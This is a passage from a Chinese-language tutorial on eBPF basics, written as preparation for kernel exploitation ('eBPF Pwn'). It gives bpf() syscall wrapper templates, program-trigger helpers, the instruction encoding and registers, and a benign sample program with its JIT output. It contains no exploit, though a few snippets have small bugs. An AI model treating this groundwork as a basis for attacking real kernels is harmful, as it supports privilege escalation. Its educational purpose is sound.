<figure class="highlight c"><figcaption><span>bpf_prog_type</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf.h#L1024">完整版</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> &#123;</span></span><br><span class="line"> BPF_PROG_TYPE_UNSPEC, <span class="comment">// 保留0作为无效类型</span></span><br><span class="line"> BPF_PROG_TYPE_SOCKET_FILTER, <span class="comment">// 用于过滤/修改socket接收的数据包</span></span><br><span class="line"> BPF_PROG_TYPE_KPROBE, <span class="comment">// 附加到kprobe上的eBPF</span></span><br><span class="line"> BPF_PROG_TYPE_SCHED_CLS, <span class="comment">// 实现流量控制（Traffic Control）的分类（过滤）</span></span><br><span class="line"> BPF_PROG_TYPE_SCHED_ACT, <span class="comment">// 实现对流量控制（Traffic Control）的操作</span></span><br><span class="line"> BPF_PROG_TYPE_TRACEPOINT, <span class="comment">// 附加到Linux内核终端trace points,来获得内核消息</span></span><br><span class="line"> ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调用模板"><a href="#调用模板" class="headerlink" title="调用模板"></a>调用模板</h2><p>由此可见，参数<code>union bpf_attr *attr</code>是最重要且繁琐的参数。在eBPF Pwn中，我们往往只需要关注部分参数，下边给出一些调用模板：</p>
<blockquote>
<p>需要的头文件&#x2F;宏：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/unistd_64.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ptr_to_u64(val) (uint64_t)val</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bpf(cmd, attr, size) syscall(__NR_bpf, cmd, attr, size)</span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><figcaption><span>map相关</span><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/bpf.2.html">manual</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建map, 一般类型为BPF_MAP_TYPE_ARRAY或BPF_MAP_TYPE_HASH</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="type">unsigned</span> <span class="type">int</span> key_size,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">int</span> value_size, <span class="type">unsigned</span> <span class="type">int</span> max_entries,</span></span><br><span class="line"><span class="params">                          <span class="type">unsigned</span> <span class="type">int</span> map_flags)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">      .map_type = map_type,</span><br><span class="line">      .key_size = key_size,</span><br><span class="line">      .value_size = value_size,</span><br><span class="line">      .max_entries = max_entries,</span><br><span class="line">      .map_flags = map_flags,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据key来查找value，传入指针</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_lookup_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">void</span> *value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = ptr_to_u64(key),</span><br><span class="line">        .value  = ptr_to_u64(value),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新/插入key-value对</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_update_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">const</span> <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">                <span class="type">uint64_t</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = ptr_to_u64(key),</span><br><span class="line">        .value  = ptr_to_u64(value),</span><br><span class="line">        .flags  = flags,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据key来删除value</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_delete_elem</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = fd,</span><br><span class="line">        .key    = ptr_to_u64(key),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据key来获取下一个key</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_get_next_key</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> *key, <span class="type">void</span> *next_key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd   = fd,</span><br><span class="line">        .key      = ptr_to_u64(key),</span><br><span class="line">        .next_key = ptr_to_u64(next_key),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>bpf_create_map</code>中的参数<code>max_entries</code>指的是map的最大容量（key-value对大于这个值不允许插入）<br><code>bpf_update_elem</code>的flags参数为<code>BPF_NOEXIST</code>（key不存在时才会更新），<code>BPF_EXIST</code>（仅在key存在时更新）或<code>BPF_ANY</code>（两种情况均可）</p>
</blockquote>
<figure class="highlight c"><figcaption><span>prog创建</span><a target="_blank" rel="noopener" href="https://www.man7.org/linux/man-pages/man2/bpf.2.html">manual</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LOG_BUF_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type type,</span></span><br><span class="line"><span class="params">              <span class="type">const</span> <span class="keyword">struct</span> bpf_insn *insns, <span class="type">int</span> insn_cnt,</span></span><br><span class="line"><span class="params">              <span class="type">const</span> <span class="type">char</span> *license)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = type,</span><br><span class="line">        .insns     = ptr_to_u64(insns),</span><br><span class="line">        .insn_cnt  = insn_cnt,</span><br><span class="line">        .license   = ptr_to_u64(license),</span><br><span class="line">        .log_buf   = ptr_to_u64(bpf_log_buf),</span><br><span class="line">        .log_size  = LOG_BUF_SIZE,</span><br><span class="line">        .log_level = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者更加简便的</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">bpf_prog_load_once</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">insns</span>[] =</span> &#123;</span><br><span class="line">        <span class="comment">/* add your code */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">        .insns = ptr_to_u64(&amp;insns),</span><br><span class="line">        .insn_cnt = <span class="keyword">sizeof</span>(insns) / <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bpf_insn),</span><br><span class="line">        .license = ptr_to_u64(<span class="string">&quot;GPL&quot;</span>),</span><br><span class="line">        .log_buf = ptr_to_u64(bpf_log_buf),</span><br><span class="line">        .log_size = LOG_BUF_SIZE,</span><br><span class="line">        .log_level = <span class="number">2</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><figcaption><span>eBPF触发模板</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过socket触发，要求cmd为BPF_PROG_TYPE_SOCKET_FILTER</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">trigger1</span><span class="params">(<span class="type">int</span> prog_fd, <span class="type">uint64_t</span>* payload)</span> &#123;</span><br><span class="line">    socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets);</span><br><span class="line">    setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(prog_fd));</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *buffer = (<span class="type">char</span> *)payload;</span><br><span class="line">    <span class="keyword">return</span> write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过BPF_PROG_TEST_RUN触发</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">trigger2</span><span class="params">(<span class="type">int</span> prog_fd, <span class="type">uint64_t</span>* payload)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[TST_DATA_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, TST_DATA_SIZE);</span><br><span class="line">    <span class="built_in">memcpy</span>(buffer + <span class="number">0xe</span>, payload, TST_DATA_SIZE - <span class="number">0xe</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">sk_buff</span> <span class="title">skb</span> =</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">tst_run_attr</span> =</span> &#123;</span><br><span class="line">        .test.data_size_in = TST_DATA_SIZE,</span><br><span class="line">        .test.data_in = ptr_to_u64(&amp;buffer),</span><br><span class="line">        .test.ctx_size_in = <span class="keyword">sizeof</span>(skb),</span><br><span class="line">        .test.ctx_in = ptr_to_u64(&amp;skb),</span><br><span class="line">    &#125;;</span><br><span class="line">    tst_run_attr.test.prog_fd = prog_fd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_PROG_TEST_RUN, &amp;tst_run_attr, <span class="keyword">sizeof</span>(tst_run_attr)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>有关trigger函数原理&#x2F;该选用哪一个的问题会在后几章详细解释</p>
</blockquote>
<h2 id="eBPF指令"><a href="#eBPF指令" class="headerlink" title="eBPF指令"></a>eBPF指令</h2><p>在prog创建时需要提供指令<code>struct bpf_insn *insns</code>，也是eBPF程序的核心部分。在eBPF Pwn中，指令的编写在触发&#x2F;利用漏洞中扮演重要角色。<br>在编写指令之前，我们需要搞明白eBPF的工作模式</p>
<blockquote>
<p>这是bpf指令结构体，看着好像并不复杂，但麻雀虽小五脏俱全</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line"> __u8 code;  <span class="comment">/* opcode */</span></span><br><span class="line"> __u8 dst_reg:<span class="number">4</span>; <span class="comment">/* dest register */</span></span><br><span class="line"> __u8 src_reg:<span class="number">4</span>; <span class="comment">/* source register */</span></span><br><span class="line"> __s16 off;  <span class="comment">/* signed offset */</span></span><br><span class="line"> __s32 imm;  <span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>一条eBPF指令分为五个部分，分别是<strong>操作码</strong>，<strong>目的寄存器</strong>，<strong>源寄存器</strong>，（有符号）<strong>偏移</strong>和（有符号）<strong>立即数</strong>，长度为64bit（8字节）</p>
<p>编码格式：</p>
<table>
    <tr>
        <td>操作码（opcode） 8bit</td>
        <td>寄存器（regs） (4 + 4 =)8bit</td>
        <td>偏移（offset）16bit</td>
    </tr>
    <tr>
        <td colspan="3">立即数（imm） 32bit</td>
    </tr>
</table>

<blockquote>
<p>存在宽编码格式指令，后接32bit无用保留区及第二个32bit的立即数，此时指令长度为128bit（16字节）（其实是两条指令拼一块）<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/include/uapi/linux/bpf_common.h">操作码宏定义</a></p>
<blockquote>
<p>详细编码格式不再赘述，<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/standardization/instruction-set.rst">详见此处</a></p>
</blockquote>
</blockquote>
<p>操作码（code）分为8类，分别为：</p>
<ul>
<li><code>BPF_LD</code> 从64位立即数（imm64, 仅允许宽指令）地址取值存入目的寄存器（src_reg）</li>
<li><code>BPF_LDX</code> 从源寄存器（dst_reg）地址取值存入目的寄存器（src_reg）</li>
<li><code>BPF_ST</code> 把立即数（imm）存入目的寄存器（dst_reg）对应地址</li>
<li><code>BPF_STX</code> 把源寄存器（src_reg）数据存入目的寄存器（dst_reg）对应地址</li>
<li><code>BPF_ALU</code> 32位算术操作</li>
<li><code>BPF_JMP</code> 64位跳转操作</li>
<li><code>BPF_JMP32</code> 32位跳转操作</li>
<li><code>BPF_ALU64</code> 64位算术操作</li>
</ul>
<p><code>BPF_LD(X)</code>&#x2F;<code>BPF_ST(X)</code>操作涉及取址，需同时提供取址大小（size），分别有：</p>
<ul>
<li><code>BPF_W</code> word (32位)</li>
<li><code>BPF_H</code> half word (16位)</li>
<li><code>BPF_B</code> byte (8位)</li>
<li><code>BPF_DW</code> double word (64位)</li>
</ul>
<blockquote>
<p>这里的word（字）的大小并不是16位而是32位</p>
</blockquote>
<p>该操作还有不同的模式，<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/standardization/instruction-set.rst#L570">参阅此处</a></p>
<p>其中<code>BPF_ALU</code>&#x2F;<code>BPF_ALU64</code>中有14种不同的操作，常用的有：</p>
<table>
<thead>
<tr>
<th>名字</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>ADD</td>
<td>dst +&#x3D; src</td>
</tr>
<tr>
<td>SUB</td>
<td>dst -&#x3D; src</td>
</tr>
<tr>
<td>MUL</td>
<td>dst *&#x3D; src</td>
</tr>
<tr>
<td>DIV</td>
<td>dst &#x3D; (src !&#x3D; 0) ? (dst &#x2F; src) : 0</td>
</tr>
<tr>
<td>MOD</td>
<td>dst &#x3D; (src !&#x3D; 0) ? (dst % src) : dst</td>
</tr>
<tr>
<td>AND</td>
<td>dst &amp;&#x3D; src</td>
</tr>
<tr>
<td>OR</td>
<td>dst |&#x3D; src</td>
</tr>
<tr>
<td>XOR</td>
<td>dst ^&#x3D; src</td>
</tr>
<tr>
<td>NEG</td>
<td>dst &#x3D; -dst</td>
</tr>
<tr>
<td>MOV</td>
<td>dst &#x3D; src</td>
</tr>
<tr>
<td>MOVSX</td>
<td>dst &#x3D; (s8,s16,s32)src （根据offset确定）</td>
</tr>
</tbody></table>
<blockquote>
<p>带符号除法&#x2F;取模操作在对应命令前加上<code>S</code>即可（<code>SDIV</code>&#x2F;<code>SMOD</code>）<br>完整版<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/standardization/instruction-set.rst#L325">参阅此处</a></p>
</blockquote>
<p><code>BPF_JMP32</code>&#x2F;<code>BPF_JMP</code>也有14种不同的类型，常用的有：</p>
<table>
<thead>
<tr>
<th>名字</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>JA</td>
<td>PC +&#x3D; offset&#x2F;imm （立即跳转）</td>
</tr>
<tr>
<td>JEQ</td>
<td>PC +&#x3D; offset if dst &#x3D;&#x3D; src （相等跳转）</td>
</tr>
<tr>
<td>JNE</td>
<td>PC +&#x3D; offset if dst !&#x3D; src （不等跳转）</td>
</tr>
<tr>
<td>JGT</td>
<td>PC +&#x3D; offset if dst &gt; src （无符号）</td>
</tr>
<tr>
<td>JGE</td>
<td>PC +&#x3D; offset if dst &gt;&#x3D; src （无符号）</td>
</tr>
<tr>
<td>JLT</td>
<td>PC +&#x3D; offset if dst &lt; src （无符号）</td>
</tr>
<tr>
<td>JLE</td>
<td>PC +&#x3D; offset if dst &lt;&#x3D; src （无符号）</td>
</tr>
<tr>
<td>JSET</td>
<td>PC +&#x3D; offset if dst &amp; src</td>
</tr>
</tbody></table>
<blockquote>
<p>带符号比较操作在对应命令中间加上<code>S</code>即可（<code>JSGT</code>，<code>JSLE</code>等）</p>
</blockquote>
<p>比较特殊的指令有：</p>
<table>
<thead>
<tr>
<th>名字</th>
<th>源寄存器(src_reg)</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>CALL</td>
<td>src_reg &#x3D; 0x0</td>
<td>通过imm对应的static id调用Helper函数</td>
</tr>
<tr>
<td>CALL</td>
<td>src_reg &#x3D; 0x1</td>
<td>PC +&#x3D; imm （作为函数调用）</td>
</tr>
<tr>
<td>CALL</td>
<td>src_reg &#x3D; 0x2</td>
<td>通过imm对应的BTF id调用Helper函数</td>
</tr>
<tr>
<td>EXIT</td>
<td>src_reg &#x3D; 0x0</td>
<td>从函数&#x2F;eBPF程序返回</td>
</tr>
</tbody></table>
<p>对于目的寄存器和源寄存器，有<code>BPF_REG_0</code>到<code>BPF_REG_10</code>一共11种，均为64位寄存器，这些寄存器的功能&#x2F;对应关系如下（下用<code>Rx</code>代替<code>BPF_REG_x</code>）：</p>
<blockquote>
<p>参阅<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/Documentation/bpf/classic_vs_extended.rst">此处</a></p>
</blockquote>
<ul>
<li>R0 (rax): 函数调用返回值&#x2F;BPF程序返回值</li>
<li>R1 (rdi): 在eBPF程序运行前自动赋值为ctx（不同的cmd参数对应着不同的类型，socket filter中为socket缓冲区），在调用函数时充当argv1</li>
<li>R2 (rsi): argv2</li>
<li>R3 (rdx): argv3</li>
<li>R4 (rcx): argv4</li>
<li>R5 (r8): argv5</li>
<li>R6 (rbx): 被调用方保留</li>
<li>R7 (r13): 被调用方保留</li>
<li>R8 (r14): 被调用方保留</li>
<li>R9 (r15): 被调用方保留</li>
<li>R10 (rbp): 只读寄存器，指向栈帧，用于访问栈</li>
</ul>
<blockquote>
<p>eBPF仅允许参数小于等于5个的函数，在设计时也要考虑这一点</p>
</blockquote>
<h2 id="eBPF指令编写"><a href="#eBPF指令编写" class="headerlink" title="eBPF指令编写"></a>eBPF指令编写</h2><p>以上便是eBPF指令（<code>struct bpf_insn</code>）的细节，了解了这些我们便可以编写eBPF程序了。<br>一个eBPF程序事实上就是一个eBPF结构体数组，我们可以直接按照数组&#x2F;结构体的声明方式直接一句一句地编写eBPF程序，但这样无异于手搓机器码，过于繁琐。<br>为了稍微简化eBPF程序的编写，Linux项目本身提供了一个<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.13.7/source/samples/bpf/bpf_insn.h#L10">宏定义头文件<strong>bpf_insn.h</strong></a>，我们可以把它复制下来作为头文件使用。</p>
<blockquote>
<p>事实上这种方法只是将手搓机器码升级到了手搓汇编，在编写复杂功能eBPF时还是要用到第三方库（libbpf&#x2F;libxdp等）</p>
</blockquote>
<p>以下是一个示例程序：</p>
<blockquote>
<p>需要的头文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;./bpf_insn.h&quot;</span> <span class="comment">// your path to bpf_insn.h</span></span></span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">bpf_prog</span>[] =</span> &#123;</span><br><span class="line">    BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_1, <span class="number">0x1</span>),</span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_2, <span class="number">0x2</span>),</span><br><span class="line"></span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-0x10</span>, <span class="number">0x3</span>),</span><br><span class="line">    BPF_ST_MEM(BPF_DW, BPF_REG_10, <span class="number">-0x8</span>, <span class="number">0x4</span>),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_10, <span class="number">-0x8</span>),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_10, <span class="number">-0x10</span>),</span><br><span class="line"></span><br><span class="line">    BPF_ALU64_REG(BPF_ADD, BPF_REG_3, BPF_REG_4),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    BPF_MOV64_IMM(BPF_REG_0, <span class="number">0x0</span>),</span><br><span class="line">    BPF_EXIT_INSN()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>对应生成的汇编如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffc0000668:  endbr64</span><br><span class="line">0xffffffffc000066c:  nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">0xffffffffc0000671:  xchg   ax,ax</span><br><span class="line">0xffffffffc0000673:  push   rbp</span><br><span class="line">0xffffffffc0000674:  mov    rbp,rsp</span><br><span class="line">0xffffffffc0000677:  endbr64</span><br><span class="line">0xffffffffc000067b:  sub    rsp,0x10</span><br><span class="line">0xffffffffc0000682:  push   r14</span><br><span class="line">0xffffffffc0000684:  mov    r14,rdi</span><br><span class="line">0xffffffffc0000687:  mov    edi,0x1</span><br><span class="line">0xffffffffc000068c:  mov    esi,0x2</span><br><span class="line">0xffffffffc0000691:  mov    QWORD PTR [rbp-0x10],0x3</span><br><span class="line">0xffffffffc0000699:  lfence</span><br><span class="line">0xffffffffc000069c:  mov    QWORD PTR [rbp-0x8],0x4</span><br><span class="line">0xffffffffc00006a4:  lfence</span><br><span class="line">0xffffffffc00006a7:  mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">0xffffffffc00006ab:  mov    rcx,QWORD PTR [rbp-0x10]</span><br><span class="line">0xffffffffc00006af:  add    rdx,rcx</span><br><span class="line">0xffffffffc00006b2:  xor    eax,eax</span><br><span class="line">0xffffffffc00006b4:  pop    r14</span><br><span class="line">0xffffffffc00006b6:  leave</span><br><span class="line">0xffffffffc00006b7:  ret</span><br></pre></td></tr></table></figure>
</blockquote>
